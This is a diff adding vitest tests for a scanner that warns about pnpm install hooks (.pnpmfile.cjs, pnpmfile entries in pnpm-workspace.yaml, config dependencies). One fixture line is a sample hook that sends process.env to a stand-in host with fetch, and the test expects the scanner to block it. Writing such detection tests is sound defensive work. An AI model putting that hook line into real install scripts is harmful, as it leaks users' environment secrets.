@@ -1,5 +1,5 @@
 import { describe, expect, it } from "vitest";
-import { projectScriptFindings } from "./project.ts";
+import { pnpmfileFindings, projectScriptFindings } from "./project.ts";
 
 const project = (files: Record<string, string>, links: string[] = []) => ({
   read: (path: string) => files[path.replace(/^\/p\//, "")],
@@ -61,5 +61,40 @@ describe("projectScriptFindings", () => {
 
   it("finds nothing without a package.json", () => {
     expect(severities({})).toEqual([]);
+  });
+});
+
+describe("pnpmfileFindings (D39)", () => {
+  const found = (files: Record<string, string>) =>
+    pnpmfileFindings("/p", project(files)).map(
+      (f) => `${f.severity}:${f.file}:${f.message.replace(/:.*/, "")}`,
+    );
+
+  it("warns that pnpm runs the pnpmfile on every install, and blocks one that sends secrets", () => {
+    expect(
+      found({ ".pnpmfile.cjs": "module.exports = { hooks: {} };" }),
+    ).toEqual(["warn:.pnpmfile.cjs:pnpm runs .pnpmfile.cjs on every install"]);
+    expect(
+      found({
+        ".pnpmfile.cjs":
+          'fetch("http://localhost:9", { body: JSON.stringify(process.env) });',
+      })[0],
+    ).toMatch(/^block:/);
+  });
+
+  it("follows pnpmfile: in pnpm-workspace.yaml and notes config dependencies", () => {
+    const out = found({
+      "pnpm-workspace.yaml":
+        "pnpmfile: hooks/pnpm.cjs\nconfigDependencies:\n  my-config: 1.0.0+sha512-x\n",
+      "hooks/pnpm.cjs": "module.exports = {};",
+    });
+    expect(out).toEqual([
+      "warn:hooks/pnpm.cjs:pnpm runs hooks/pnpm.cjs on every install",
+      "warn:pnpm-workspace.yaml:pnpm installs config dependencies first and loads their pnpmfiles",
+    ]);
+  });
+
+  it("finds nothing in a project without either", () => {
+    expect(found({ "package.json": "{}" })).toEqual([]);
   });
 });
